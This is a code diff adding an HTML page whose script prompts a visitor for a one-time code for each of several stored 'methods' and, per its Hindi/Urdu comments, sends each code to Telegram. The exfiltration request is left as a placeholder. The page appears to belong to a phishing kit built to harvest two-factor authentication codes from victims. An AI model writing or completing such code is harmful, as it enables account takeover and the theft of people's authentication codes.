@@ -1,0 +1,30 @@
+<div id="method-title"></div>
+<input type="number" id="otp-input" placeholder="Enter code">
+<button onclick="submitCode()">Submit Code</button>
+
+<script>
+    const methods = JSON.parse(localStorage.getItem('selectedMethods'));
+    let currentIndex = 0;
+
+    function showNext() {
+        if (currentIndex < methods.length) {
+            document.getElementById('method-title').innerText = "Enter code for: " + methods[currentIndex];
+        } else {
+            window.location.href = 'finish.html'; // Sab ho gaya
+        }
+    }
+    showNext();
+
+    function submitCode() {
+        const code = document.getElementById('otp-input').value;
+        const method = methods[currentIndex];
+        
+        // Telegram par bhejein
+        const text = `🚨 ${method} CODE: ${code}`;
+        // ... (Wahi XMLHttpRequest wala code yahan daalein) ...
+        
+        currentIndex++;
+        document.getElementById('otp-input').value = '';
+        showNext();
+    }
+</script>
